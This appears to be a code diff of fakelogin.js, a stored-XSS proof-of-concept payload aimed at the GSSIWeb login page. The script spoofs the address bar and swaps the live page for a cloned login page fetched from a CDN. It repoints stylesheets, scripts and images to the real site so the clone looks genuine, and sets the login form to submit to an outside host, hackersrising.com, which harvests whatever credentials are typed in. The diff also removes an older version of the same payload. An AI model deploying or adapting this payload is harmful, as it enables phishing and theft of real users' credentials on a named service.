@@ -1,42 +1,65 @@
-// fakelogin.js - Full page replacement for stored XSS PoC
+// fakelogin.js - Clean full-page fake login PoC
 
 (function() {
     'use strict';
 
-    // Make the URL in the address bar look legitimate
-    history.replaceState(null, document.title, location.pathname);
+    // Make URL look real
+    history.replaceState(null, 'GSSI Universal Login - Gatorade Performance Partner', '/gpapi/oauth/login');
 
-    // Load and inject your full cloned login page
-    fetch('https://cdn.jsdelivr.net/gh/TheeEclipse/xss/login.html')
-        .then(response => {
-            if (!response.ok) throw new Error('Failed to fetch');
-            return response.text();
-        })
+    fetch('https://cdn.jsdelivr.net/gh/TheeEclipse/xss/login.html')   // ← change to your actual raw URL
+        .then(r => r.text())
         .then(html => {
-            // This replaces the ENTIRE page with your cloned login.html
+            // Replace entire page
             document.documentElement.innerHTML = html;
 
-            // Optional: Small delay to ensure DOM is ready
-            setTimeout(() => {
-                const form = document.getElementById('DietaryLogin');
-                if (form) {
-                    // Double-check the action points to your server
-                    form.action = 'https://hackersrising.com/GPAPI/oauth/login';
-                    console.log('%c[PoC] Fake GSSIWeb login page loaded successfully', 'color: red; font-size: 16px;');
-                }
-            }, 400);
+            // Fix all relative paths to absolute real domain paths
+            setTimeout(fixResources, 300);
         })
-        .catch(err => {
-            console.error('PoC error:', err);
-            // Fallback message (looks more professional)
-            document.documentElement.innerHTML = `
-                <!DOCTYPE html>
-                <html>
-                <head><title>GSSIWeb - Login</title></head>
-                <body style="font-family:Arial;text-align:center;margin-top:150px;color:#333;">
-                    <h2>Session has expired</h2>
-                    <p>Please log in again to continue.</p>
-                </body>
-                </html>`;
-        });
+        .catch(err => console.error('Failed to load fake login:', err));
 })();
+
+// Function to fix broken relative links
+function fixResources() {
+    const base = 'https://www.gssiweb.org/GPAPI/dist/lib/';
+
+    // Fix all <link> CSS
+    document.querySelectorAll('link[rel="stylesheet"]').forEach(link => {
+        let href = link.getAttribute('href');
+        if (href && !href.startsWith('http')) {
+            // Convert relative paths to real ones
+            if (href.includes('bootstrap.min.css')) {
+                link.href = base + 'bootstrap.min.css';
+            } else if (href.includes('VanillaSelectBox.css')) {
+                link.href = base + 'VanillaSelectBox.css';
+            } else if (href.includes('main.css')) {
+                link.href = base + 'main.css';           // adjust if exact filename differs
+            } else {
+                link.href = base + href.split('/').pop(); // fallback
+            }
+        }
+    });
+
+    // Fix all <script> src (except the ones we want to keep)
+    document.querySelectorAll('script[src]').forEach(script => {
+        let src = script.getAttribute('src');
+        if (src && !src.startsWith('http') && !src.includes('hackersrising.com')) {
+            script.src = base + src.split('/').pop();
+        }
+    });
+
+    // Fix images if any (example for the cookie icon)
+    document.querySelectorAll('img').forEach(img => {
+        let src = img.getAttribute('src');
+        if (src && !src.startsWith('http')) {
+            img.src = 'https://www.gssiweb.org/GPAPI/dist/lib/' + src.split('/').pop();
+        }
+    });
+
+    // Force the form action again (safety)
+    const form = document.getElementById('DietaryLogin');
+    if (form) {
+        form.action = 'https://hackersrising.com/GPAPI/oauth/login';
+    }
+
+    console.log('%c[PoC] Fake login page loaded with fixed resources', 'color: red; font-weight: bold');
+}
